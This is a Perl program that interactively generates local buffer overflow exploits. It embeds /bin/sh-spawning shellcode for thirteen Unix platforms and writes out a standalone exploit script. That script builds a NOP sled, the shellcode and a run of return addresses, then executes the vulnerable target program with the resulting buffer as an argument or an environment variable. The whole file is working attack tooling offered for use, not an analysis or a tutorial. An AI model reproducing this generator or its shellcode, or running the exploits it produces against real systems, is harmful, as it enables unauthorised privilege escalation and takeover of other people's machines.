#!/usr/bin/perl

#
# bofgen.pl - by CommPort5 [@LucidX.com]
# a local buffer overflow exploit generation program
# http://bofgen.LucidX.com
#

@{$exploit{osnums}} = (
	"aix",	"bsdi",	"dg_ux",	"freebsd",	"hp_ux",
	"linux_x86",	"linux_sparc",	"openbsd",	"ppc_linux",
	"ppc_bsd",	"openserver",	"solaris_sparc",	"unixware",
);

%shellcode = (
	aix =>
'0x7c0802a6 . 0x9421fbb0 . 0x90010458 . 0x3c60f019 .
0x60632c48 . 0x90610440 . 0x3c60d002 . 0x60634c0c .
0x90610444 . 0x3c602f62 . 0x6063696e . 0x90610438 .
0x3c602f73 . 0x60636801 . 0x3863ffff . 0x9061043c .
0x30610438 . 0x7c842278 . 0x80410440 . 0x80010444 .
0x7c0903a6 . 0x4e800420 . 0x0',

	bsdi =>
'"\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76" .
"\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07" .
"\xff\xe8\xdc\xff\xff\xff/bin/sh\x00"',

	dg_ux =>
'"\x58\xfe\xde\x23\x0f\x04\xde\x47\x04\x74\xf0\x43\xa4\x01\x8f\xb0" .
"\xa4\x01\x4f\x21\xfb\x6b\x3f\x24\x01\x80\x21\x20\xa8\x01\x2f\xb4" .
"\x10\x04\xff\x47\x80\xf4\xe2\x47\xff\x7f\x4a\x6b\x69\x6e\x3f\x24" .
"\x2f\x62\x21\x20\x73\x68\x5f\x24\xff\x2f\x42\x20\x82\x16\x41\x48" .
"\x90\x01\x2f\xb0\x94\x01\x4f\xb0\x98\x01\xef\xb5\xa0\x01\xef\xb7" .
"\x90\x01\x0f\x22\x98\x01\x2f\x22\x12\x04\xff\x47\x80\x74\xe7\x47" .
"\xff\x7f\xea\x6b"',

	freebsd =>
'"\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62" .
"\x69\x89\xe3\x51\x52\x53\x53\x6a\x3b\x58\xcd\x80"',

	hp_ux =>
'"\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40" .
"\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe" .
"\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff"',

	linux_x86 =>
'"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d" .
"\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3" .
"\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0" .
"\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh"',

	linux_sparc =>
'"\x90\x1a\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x10" .
"\x90\x1a\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x10" .
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e" .
"\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0" .
"\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x10"',

	openbsd =>
'"\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62" .
"\x69\x89\xe3\x51\x52\x53\x53\x6a\x3b\x58\xcd\x80"',

	ppc_linux =>
'0x7CC63278 . 0x2F867FFF . 0x41BC0054 . 0x7C6802A6 .
0xB0C3FFF9 . 0xB0C3FFF1 . 0x38867FF0 . 0x38A67FF4 .
0x38E67FF3 . 0x7CA52278 . 0x7CE72278 . 0x7C853A14 .
0x7CC419AE . 0x7C042A14 . 0x7CE72850 . 0x7C852A14 .
0x7C63212E . 0x7C832214 . 0x7CC5212E . 0x7CA52A78 .
0x44FFFF02 . 0x7CE03B78 . 0x44FFFF02 . 0x4BFFFFB1 .
0x2F62696E . 0x2F73685A . 0xFFFFFFFF . 0xFFFFFFFF',

	ppc_bsd =>
'0x7CC63278 . 0x2F867FFF . 0x41BC0054 . 0x7C6802A6 . 
0xB0C3FFF9 . 0xB0C3FFF1 . 0x38867FF0 . 0x38A67FF4 . 
0x38E67FF3 . 0x7CA52278 . 0x7CE72278 . 0x7C853A14 . 
0x7CC419AE . 0x7C042A14 . 0x7CE72850 . 0x7C852A14 . 
0x7C63212E . 0x7C832214 . 0x7CC5212E . 0x7CA52A78 . 
0x44FFFF02 . 0x7CE03B78 . 0x44FFFF02 . 0x4BFFFFB1 . 
0x2F62696E . 0x2F73685A . 0xFFFFFFFF . 0xFFFFFFFF',

	openserver =>
'"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0" .
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff" .
"\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa"',

	solaris_sparc =>
'"\x90\x1b\xc0\x0f\x82\x10\x20\x17\x91\xd0\x20\x08\x90\x1b\xc0\x0f"
"\x82\x10\x20\x1b\x91\xd0\x20\x08\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1b\xc0\x0f"
"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd0\x20\x08"',

	unixware =>
'"\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4" .
"\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf" .
"\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff" .
"\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53" .
"\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f" .
"\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff"',
);

%default = (
	name	=> "exploit.pl",
	nop	=> '\x90',
	ret	=> '0xbfffffff',
	offset	=> 0,
	rmenv	=> 0,
	aoff	=> 0,
	roff	=> 0,
	aret	=> 0,
	rret	=> 0,
);

%colors = (    'clear'      => 0,
               'reset'      => 0,
               'bold'       => 1,
               'dark'       => 2,
               'underline'  => 4,
               'underscore' => 4,
               'blink'      => 5,
               'reverse'    => 7,
               'concealed'  => 8,
               'black'      => 30,   'on_black'   => 40,
               'red'        => 31,   'on_red'     => 41,
               'green'      => 32,   'on_green'   => 42,
               'yellow'     => 33,   'on_yellow'  => 43,
               'blue'       => 34,   'on_blue'    => 44,
               'magenta'    => 35,   'on_magenta' => 45,
               'cyan'       => 36,   'on_cyan'    => 46,
               'white'      => 37,   'on_white'   => 47,
);

print "\nBuffer Overflow Exploit Generation program [bofgen.pl]\n";
print "By CommPort5 [\@LucidX.com]\n\n";

print "* = required, []'s = default (and required)\n\n";

print "name of your exploit [$default{name}]: ";
chomp($exploit{name} = <STDIN>);
$exploit{name} = $default{name} if $exploit{name} eq '';

while (!$exploit{path}) {
 print "* path (full path recommended) to exploitable program: ";
 chomp($exploit{path} = <STDIN>);
}

print "nop [$default{nop}]: ";
chomp($exploit{nop} = <STDIN>);
$exploit{nop} = $default{nop} if $exploit{nop} eq '';

print "return address [$default{ret}]: ";
chomp($exploit{ret} = <STDIN>);
$exploit{ret} = $default{ret} if $exploit{ret} eq '';

while ($exploit{offset} !~ /^\d+$/) {
 print "offset [$default{offset}]: ";
 chomp($exploit{offset} = <STDIN>);
 $exploit{offset} = $default{offset} if $exploit{offset} eq '';
}

while ($exploit{len} !~ /^\d+$/) {
 print "* length to overwrite %eip (without the +100): ";
 chomp($exploit{len} = <STDIN>);
}
$exploit{len} += 100;

while ($exploit{rmenv} !~ /^(1|0)$/) {
 print "remove all environment variables before executing program (1 = true, 0 = false) [$default{rmenv}]: ";
 chomp($exploit{rmenv} = <STDIN>);
 $exploit{rmenv} = $default{rmenv} if $exploit{rmenv} eq '';
}

while ($exploit{type} !~ /^(1|2)$/) {
 print "* type of buffer overflow, 1 = arguement, 2 = environment: ";
 chomp($exploit{type} = <STDIN>);
}

for ($i = 1; $i <= @{$exploit{osnums}}; $i += 2) {
 print "$i = $exploit{osnums}[$i-1]\t\t";
 if ($exploit{osnums}[$i]) {
  print ($i + 1);
  print " = $exploit{osnums}[$i]";
 }
 print "\n";
}
while ($exploit{os} !~ /^(\s*\d+\s*)+$/) {
 print "* enter the OSs you would like support for (enter numbers, whitespace seperated): ";
 chomp($exploit{os} = <STDIN>);
}
foreach (split(/\s+/, $exploit{os})) {
 push(@{$exploit{oss}}, $exploit{osnums}[$_-1]);
}

print "preceding arguements (before buffer overflow, if any): ";
chomp($exploit{parg} = <STDIN>);

do {
 print "insert environment variable (key name, if any - not buffer overflow key): ";
 chomp($tmp = <STDIN>);
 if ($tmp) {
  print "insert environment data for key $tmp: ";
  chomp($exploit{keys}{$tmp} = <STDIN>);
 }
} while ($tmp);

while ($exploit{aoff} !~ /^(1|0)$/) {
 print "accept an offset from the user in command line (1 = true, 0 = false) [$default{aoff}]: ";
 chomp($exploit{aoff} = <STDIN>);
 $exploit{aoff} = $default{aoff} if $exploit{aoff} eq '';
}

if ($exploit{aoff}) {
 while ($exploit{roff} !~ /^(1|0)$/) {
  print "require an offset from the user in command line (1 = true, 0 = false) [$default{roff}]: ";
  chomp($exploit{roff} = <STDIN>);
  $exploit{roff} = $default{roff} if $exploit{roff} eq '';
 }
}

while ($exploit{aret} !~ /^(1|0)$/) {
 print "accept a return address from the user in command line (1 = true, 0 = false) [$default{aret}]: ";
 chomp($exploit{aret} = <STDIN>);
 $exploit{aret} = $default{aret} if $exploit{aret} eq '';
}
 
if ($exploit{aret}) {
 while ($exploit{rret} !~ /^(1|0)$/) {
  print "require a return address from the user in command line (1 = true, 0 = false) [$default{rret}]: ";
  chomp($exploit{rret} = <STDIN>);
  $exploit{rret} = $default{rret} if $exploit{rret} eq '';
 }
}

if ($exploit{type} == 2) {
 while (!$exploit{key}) {
  print "enter key to use to store buffer: ";
  chomp($exploit{key} = <STDIN>);
 }
}

$scdata = '%shellcode = (';
for ($i = 0; $i < @{$exploit{oss}}; $i++) {
 $scdata .= "\n\t$exploit{oss}[$i]\t=>\n$shellcode{$exploit{oss}[$i]},\n";
}
$scdata .= ");\n\n\@os = (";
for ($i = 0; $i < @{$exploit{oss}}; $i++) {
 $scdata .= "\n\t\"$exploit{oss}[$i]\",";
}
$scdata .= "\n);";

$argdata = "<OS #> ";
$argnum = 1;
$argmax = 1;
if ($exploit{aoff}) {
 if ($exploit{roff}) {
  $argdata .= "<-o offset> ";
  $argnum += 2;
  $argmax += 2;
 }
 else {
  $argdata .= "[-o offset] ";
  $argmax += 2;
 }
}
if ($exploit{aret}) {
 if ($exploit{rret}) {
  $argdata .= "<-r return address> ";
  $argnum += 2;
  $argmax += 2;
 }
 else {
  $argdata .= "[-r return address] ";
  $argmax += 2;
 }
}

print "\n";
$comment = << "EOF";

#
# $exploit{name} - generated by bofgen.pl by CommPort5 [\@LucidX.com]
# a buffer overflow exploit generation program
# http://bofgen.LucidX.com
#
EOF

$data = << "EOF";
#!/usr/bin/perl
$comment
(\$osn, \$offset, \$ret) = &check;

$scdata

\$len = $exploit{len};
\$nop = "$exploit{nop}";

for (\$i = 0; \$i < (\$len - length(\$shellcode{\$os[\$osn-1]}) - 100); \$i++) {
 \$buffer .= \$nop;
}

\$buffer .= \$shellcode{\$os[\$osn-1]};
\$addr = pack('l', (\$ret + \$offset));
for (\$i += length(\$shellcode{\$os[\$osn-1]}); \$i < \$len; \$i += 4) {
 \$buffer .= \$addr;
}

EOF

if ($exploit{rmenv}) {
 $data .= "foreach (keys(\%ENV)) {\n delete \$ENV{\$_};\n}\n";
}

foreach (keys(%{$exploit{keys}})) {
 $data .= "\$ENV{$_} = \"$exploit{keys}{$_}\";\n";
}

if ($exploit{type} == 1) {
 $data .= "\nexec(\"$exploit{path}\", ";
 foreach (split(/\s+/, $exploit{parg})) {
  $data .= "\"$_\", ";
 }
 $data .= "\$buffer);\n";
}
else {
 $data .= "\n\$ENV{$exploit{key}} = \$buffer;\nexec(\"$exploit{path}\"";
 foreach (split(/\s+/, $exploit{parg})) {
  $data .= ", \"$_\"";
 }
 $data .= ");\n";
}

$data .= << "EOF";


sub check {
 \$ret = $exploit{ret};
 \$offset = $exploit{offset};
 if (\@ARGV < $argnum or \@ARGV > $argmax) {
  &error;
 }
 \$osn = shift(\@ARGV);
 for (\$i = 0; \$i < \@ARGV; \$i++) {
  if (\$ARGV[\$i] =~ /^[^-]/ && \$ARGV[\$i-1] =~ /^[^-]/) {
   &error;
  }
  if (\$ARGV[\$i] =~ /^-/) {
   if (\$ARGV[\$i] =~ /^-(o|r)\$/i) {
    if (\$1 eq 'o') {
     \$offset = \$ARGV[\$i+1];
    }
    elsif (\$1 eq 'r') {
     \$ret = \$ARGV[\$i+1];
    }
   }
   else {
    &error;
   }
  }
 }
 return(\$osn, \$offset, \$ret);
}

sub error {
 print STDERR "usage: \$0 $argdata\\n" if \@ARGV < $argnum;
EOF

for ($i = 1; $i <= @{$exploit{oss}}; $i++) {
 $data .= " print STDERR \" $i = $exploit{oss}[$i-1]\\n\";\n";
}
$data .= " die \"\\n\";\n}\n";
$data .= $comment;

open(EXPLOIT, ">$exploit{name}") or die "Can't open $exploit{name} for writing: $!\n";
print EXPLOIT $data;
close(EXPLOIT);

print STDERR "Exploit saved in $exploit{name}\n";
die "\n- made by bofgen.pl - http://bofgen.LucidX.com - CommPort5\@LucidX.com -\n";

# h4w h4w h4w
# -cp5
